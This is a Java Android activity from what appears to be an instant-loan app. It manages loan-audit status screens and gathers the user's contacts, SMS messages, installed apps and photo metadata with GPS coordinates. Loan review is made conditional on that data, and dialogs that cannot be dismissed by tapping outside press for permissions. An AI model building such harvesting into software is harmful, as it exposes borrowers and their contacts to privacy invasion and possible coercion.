package com.lirongyuns.happyrupees.activity;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;

import com.lirongyuns.happyrupees.R;
import com.lirongyuns.happyrupees.annonation.SetActivity;
import com.lirongyuns.happyrupees.annonation.SetView;
import com.lirongyuns.happyrupees.dialog.LoadingDialog;
import com.lirongyuns.happyrupees.presenter.AuditUcashSystemResultPresenterImpl;
import com.lirongyuns.happyrupees.presenter.CrawlPhoneDataPresenterImpl;
import com.lirongyuns.happyrupees.utils.AppInfoUtils;
import com.lirongyuns.happyrupees.utils.ConstantUtils;
import com.lirongyuns.happyrupees.utils.PermissionUtil;
import com.lirongyuns.happyrupees.utils.PhoneUtils;
import com.lirongyuns.happyrupees.utils.SmsUtils;
import com.lirongyuns.happyrupees.utils.ToastUtil;
import com.lirongyuns.happyrupees.view.CrawlView;
import com.lirongyuns.happyrupees.view.WaitView;
import com.xxl.loan.sdk.utils.PhotoUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

@SetActivity(R.layout.activity_wait)
public class WaitActivity extends BaseActivity implements WaitView, CrawlView {

    @SetView(R.id.wait_title)
    private TextView wait_title;
    @SetView(R.id.wait_iv)
    private ImageView wait_iv;
    @SetView(R.id.wait_content)
    private TextView wait_content;
    @SetView(R.id.wait_btn)
    private Button wait_btn;
    @SetView(R.id.timer)
    private TextView timer;

    private AuditUcashSystemResultPresenterImpl prensenter;
    private CrawlPhoneDataPresenterImpl mCrawlPhoneDatasPresenter;
    private JSONArray mPhotoDatas;//相册数据
    private JSONArray mAppDatas;//APP数据
    private JSONArray mSmsDatas;//短信数据
    private JSONArray mContactDatas;//手机联系人数据
    private Message message;

    @SuppressLint("HandlerLeak")
    private Handler mHandler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 101:
                    if(null == mPhotoDatas || mPhotoDatas.length()<1){
                        String photoMsg = "No access to album data. Please check if permissions are enabled";
                        showPremissionDialog(photoMsg);
                        return;
                    }
                    break;
                case 102:
                    if(null == mAppDatas || mAppDatas.length()<1){
                        String appMsg = "No access to apps data. Please check if permissions are enabled";
                        showPremissionDialog(appMsg);
                        return;
                    }
                    break;
                case 103:
                    if(null == mSmsDatas || mSmsDatas.length()<1){
                        String smsMsg = "No access to Sms data. Please check if permissions are enabled";
                        showPremissionDialog(smsMsg);
                        return;
                    }
                    break;
                case 104:
                    if (null == mContactDatas || mContactDatas.length()<1) {
                        String contactMsg = "No access to contacts data. Please check if permissions are enabled";
                        showPremissionDialog(contactMsg);
                        return;
                    }
                    break;

                case 105:
                    LoadingDialog.close();
                    if("1".equals(ConstantUtils.IS_UPLOAD_ALBUM) && "1".equals(ConstantUtils.IS_UPLOAD_CONTACT) &&
                            "1".equals(ConstantUtils.IS_UPLOAD_APP) && "1".equals(ConstantUtils.IS_UPLOAD_SMS)){

                        prensenter.getAuditStateFromServer(getApp().getMemberId(), "1",getApp().getRiskId());
                        setFirebaseEvent(getApp().getMemberId(), "COMMIT_AUDIT");
                        appsflyerEvent(getApp().getMemberId(), "COMMIT_AUDIT");

                        Bundle bundle = new Bundle();
                        bundle.putString("bankAccount", getApp().getMemberId());
                        setFaceBookEvent(bundle, "COMMIT_AUDIT");
                    };
                    break;
                case 0:
                    timer.setText(time.get());
                    break;
                case 1:
                    startActivity(new Intent(WaitActivity.this, LoginActivity.class));
                    mThreadPool.shutdownNow();
                    finish();
                    break;
            }
        }
    };
    private boolean mIsCanBack = true;

    private ScheduledExecutorService mThreadPool;
    private AtomicInteger time;

    @Override
    protected void onDestroy() {
        super.onDestroy();
        mThreadPool.shutdownNow();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        String flag = intent.getStringExtra("flag");
        prensenter = new AuditUcashSystemResultPresenterImpl(this);
        mCrawlPhoneDatasPresenter = new CrawlPhoneDataPresenterImpl(this);
        mCrawlPhoneDatasPresenter.getUserInfoFromServer(getApp().getMemberId());

        //FyLib.getInstance().getAllData();

        if(!TextUtils.isEmpty(ConstantUtils.CARD_CHECK_MSG) && "14".equals(ConstantUtils.LOAN_STATUS)){
            wait_btn.setText("BIND BANK CARD");

            wait_btn.setOnClickListener((View v)->{
                startActivity(new Intent(WaitActivity.this,BindCardActivity.class));
            });
        }

        if("Bind_Bank_To".equals(flag) || "Face_Page_To".equals(flag) ||
                "17".equals(ConstantUtils.LOAN_STATUS) || "13".equals(ConstantUtils.LOAN_STATUS)||
                (("10".equals(ConstantUtils.LOAN_STATUS) && ("4".equals(ConstantUtils.REPEATED_BORROWING)
                        || "1".equals(ConstantUtils.REPEATED_BORROWING)
                        || "3".equals(ConstantUtils.REPEATED_BORROWING))))
        ){
            wait_iv.setVisibility(View.GONE);
            wait_title.setText("Count ddown");
            timer.setVisibility(View.VISIBLE);
            wait_content.setText("Please wait a minute");
            wait_btn.setVisibility(View.GONE);

            mThreadPool = Executors.newScheduledThreadPool(1);
            time = new AtomicInteger(60);
            mThreadPool.scheduleAtFixedRate(()->{
                int i = time.getAndDecrement();
                Message msg = mHandler.obtainMessage();
                msg.what = 0;
                mHandler.sendMessage(msg);
                if (time.get() == 0){
                    msg.what = 1;
                    mHandler.sendMessage(msg);
                }

            },1,1, TimeUnit.SECONDS);
        }


        if(("17".equals(ConstantUtils.LOAN_STATUS)  && ("4".equals(ConstantUtils.REPEATED_BORROWING)
                || "1".equals(ConstantUtils.REPEATED_BORROWING)
                || "0".equals(ConstantUtils.REPEATED_BORROWING)
                || "3".equals(ConstantUtils.REPEATED_BORROWING)))
                || ("10".equals(ConstantUtils.LOAN_STATUS)
                && ("4".equals(ConstantUtils.REPEATED_BORROWING)
                || "1".equals(ConstantUtils.REPEATED_BORROWING)
                || "0".equals(ConstantUtils.REPEATED_BORROWING)
                || "3".equals(ConstantUtils.REPEATED_BORROWING)))){
            mIsCanBack = false;
            if("1".equals(ConstantUtils.IS_ALL_UPLOAD)){
                //FyLib.getInstance().getAllData();
                LoadingDialog.open(this);
                setFirebaseEvent(getApp().getMemberId(), "COMMIT_AUDIT");
                appsflyerEvent(getApp().getMemberId(), "COMMIT_AUDIT");

                Bundle bundle = new Bundle();
                bundle.putString("bankAccount", getApp().getMemberId());
                setFaceBookEvent(bundle, "COMMIT_AUDIT");
                prensenter.getAuditStateFromServer(getApp().getMemberId(), "1",getApp().getRiskId());
            }else{
                LoadingDialog.open(this);
                message = mHandler.obtainMessage();
                message.what = 105;
                mHandler.sendMessageDelayed(message, 1000*8);
            }
        }
        setAuditResultPageUIDisplay();
    }

    private void showPremissionDialog(String message){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Permissions prompt");
        builder.setMessage(message);
        builder.setPositiveButton("enter", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                PermissionUtil.gotoPermission(WaitActivity.this);
            }
        });

        AlertDialog alertDialog = builder.create();
        alertDialog.show();
        alertDialog.setCanceledOnTouchOutside(false);
    }

    @Override
    public void onCommitSuccess() {
        prensenter.getUserInfoFromServer(getApp().getMemberId());
        mIsCanBack = false;
    }

    /**
     * 设置审核页面的UI ConstantUtils.LOAN_STATUS 2.审核中、3.拒绝、4.机审通过、5.机审拒绝、6.人审通过、7.人审拒绝、
     * 8借款中、9.逾期、10.还款完成 11放款失败、12待还款 13.验证银行卡中 14验证银行卡失败 15验证银行卡成功
     * 16.放款处理中 17.审核中 18.确认提现
     */
    @Override
    public void setAuditResultPageUIDisplay() {
        String status = ConstantUtils.LOAN_STATUS;
        if(status.equals("2")){
            //审核中
            wait_title.setText("In the review");
//            pic.setImageResource(R.drawable.pic_audit_status);
            wait_content.setText("Platform is reviewing your information.");
            wait_btn.setText("OK,I KNOW");
        }
        else  if(status.equals("14")){
            //验卡失败
//            pic.setImageResource(R.drawable.pic_audit_cash_failed);
            wait_content.setText(ConstantUtils.CARD_CHECK_MSG);
            wait_title.setText("Validation fails");
            wait_content.setText("You have verified 3 times today,Please try again in 24 hours.");
            wait_btn.setText("HOME");
        }
        else if(status.equals("3")||status.equals("5")||status.equals("7")){
            //审核失败
            wait_title.setText("Audit failure");
//            pic.setImageResource(R.drawable.pic_audit_fail);
            wait_content.setText("Sorry you don't meet the loan requirements.");
            wait_btn.setText("OK,I KNOW");
        }
        else if(status.equals("4")||status.equals("6")){
            //审核成功
            wait_title.setText("Audit Success");
//            pic.setImageResource(R.drawable.pic_audit_succeed);
            wait_content.setText("Congratulations to pass the review.");
            wait_btn.setText("THANK YOU");
        }
        else if(status.equals("11")){
            //放款失败
            wait_title.setText("Loan failure");
//            pic.setImageResource(R.drawable.pic_audit_cash_failed);
            wait_content.setText("Sorry loan failure,wish you a happy life.");
            wait_btn.setText("OK,I KNOW");
        }
        else if(status.equals("16")||status.equals("15")||status.equals("8")||status.equals("18")||status.equals("13")){
            //放款中
            wait_title.setText("In the lending");
            wait_content.setText("Please wait,The platform is lending.");
            wait_btn.setText("PLEASE WAIT");
        }
        else if(status.equals("21")){
            //停止放款
//            pic.setImageResource(R.drawable.pic_refuse_photo);
            wait_title.setText("Try tomorrow");
            wait_content.setText("Borrowers are full today.Please try again tomorrow.");
            wait_btn.setText("TRY TOMORROW");
        }
        else if(status.equals("19")){
            //人脸比对失败
            wait_title.setText("Audit failure");
//            pic.setImageResource(R.drawable.pic_audit_fail);
            wait_content.setText("Sorry you don't meet the loan requirements.(Face compare failed)");
            wait_btn.setText("OK,I KNOW");
        }
        else if(status.equals("20")){
            //P卡验证失败
            wait_title.setText("Audit failure");
//            pic.setImageResource(R.drawable.pic_audit_fail);
            wait_content.setText("Sorry you don't meet the loan requirements.(Pand Card error)");
            wait_btn.setText("OK,I KNOW");
        }


        if("4".equals(ConstantUtils.REPEATED_BORROWING)){
            wait_title.setText("In the review");
//            pic.setImageResource(R.drawable.pic_audit_status);
            wait_content.setText("Platform is reviewing your information.");
            wait_btn.setText("OK,I KNOW");
        }
    }

    @Override
    public void startCrawPhoneData() {
        if("0".equals(ConstantUtils.IS_UPLOAD_ALBUM)){
            //未上传相册
            checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE, isGrant -> {
                if (isGrant) {
                    getJsonArrayPhotos();
                } else {
                    showToast("Permission denied");
                }
            });
        }

        if("0".equals(ConstantUtils.IS_UPLOAD_SMS)){
            //未上传SMS短信
            checkPermission(Manifest.permission.READ_SMS, isGrant -> {
                if (isGrant) {
                    getJsonArraySms();
                } else {
                    showToast("Permission denied");
                }
            });
        }

        if("0".equals(ConstantUtils.IS_UPLOAD_APP)){
            //未上传APP信息
            checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE, isGrant -> {
                if (isGrant) {
                    getJsonArrayApps();
                } else {
                    showToast("Permission denied");
                }
            });
        }


        if("0".equals(ConstantUtils.IS_UPLOAD_CONTACT)){
            //未上传通讯录
            checkPermission(Manifest.permission.READ_CONTACTS, isGrant -> {
                if (isGrant) {
                    getJsonArrayContact();
                } else {
                    showToast("Permission denied");
                }
            });
        }
    }

    @Override
    public void showToast(String msg) {
        ToastUtil.show(WaitActivity.this,msg);
    }

    private void getJsonArrayContact() {
        new Thread(){
            @Override
            public void run() {
                try {
                    ArrayList<JSONObject> contacts = PhoneUtils.getContacts(getApplicationContext());
                    JSONArray jsonArray = new JSONArray(contacts);
                    mContactDatas = jsonArray;
                } catch (JSONException e) {
                    e.printStackTrace();
                    mContactDatas = null;
                }
                Message message = mHandler.obtainMessage();
                message.what = 104;
                mHandler.sendMessage(message);

            }
        }.start();
    }

    private void getJsonArrayApps() {
        ArrayList<JSONObject> datas = new ArrayList<>();
        new Thread(){
            @Override
            public void run() {
                try {
                    ArrayList<AppInfoUtils.AppInfo> appInfos = AppInfoUtils.getInstallPackages(getApplicationContext());
                    for (AppInfoUtils.AppInfo info: appInfos) {
                        String app_name = info.getAppName();
                        String installTime = info.getAppInstallTime();
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("name", app_name);
                        jsonObject.put("installTime", installTime);
                        datas.add(jsonObject);
                    }
                    JSONArray jsonArray = new JSONArray(datas);
                    mAppDatas =  jsonArray;
                }catch (JSONException e) {
                    e.printStackTrace();
                    mAppDatas = null;
                }

                Message message = mHandler.obtainMessage();
                message.what = 102;
                mHandler.sendMessage(message);
            }
        }.start();
    }

    private void getJsonArraySms() {
        new Thread(){
            @Override
            public void run() {
                try {
                    ArrayList<JSONObject> smsMessage = SmsUtils.getPhoneSmsMessage(getApplicationContext());
                    JSONArray jsonArray = new JSONArray(smsMessage);
                    mSmsDatas = jsonArray;
                }catch (Exception e){
                    e.printStackTrace();
                    mSmsDatas = null;
                }
                Message message = mHandler.obtainMessage();
                message.what = 103;
                mHandler.sendMessage(message);
            }
        }.start();
    }

    private void getJsonArrayPhotos() {
        ArrayList<JSONObject> datas = new ArrayList<>();
        new Thread(){
            @Override
            public void run() {
                try {
                    ArrayList<PhotoUtils.PhotoInfo> photoInfos = PhotoUtils.getPhotoInfo(getApplicationContext());
                    for (PhotoUtils.PhotoInfo photoInfo : photoInfos) {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("longitude", photoInfo.getLongitude());
                        jsonObject.put("latitude", photoInfo.getLatitude());
                        jsonObject.put("name", photoInfo.getTitle());
                        jsonObject.put("date", photoInfo.getAddDate());
                        jsonObject.put("model", photoInfo.getAuthor());
                        jsonObject.put("height",photoInfo.getHeight());
                        jsonObject.put("width",photoInfo.getWidth());
                        jsonObject.put("author", photoInfo.getAuthor());
                        jsonObject.put("createTime", photoInfo.getModifyDate());
                        datas.add(jsonObject);
                    }
                    JSONArray jsonArray = new JSONArray(datas);
                    mPhotoDatas = jsonArray;
                }catch (JSONException e) {
                    e.printStackTrace();
                    mPhotoDatas = null;
                }
                Message message = mHandler.obtainMessage();
                message.what = 101;
                mHandler.sendMessage(message);
            }
        }.start();
    }
}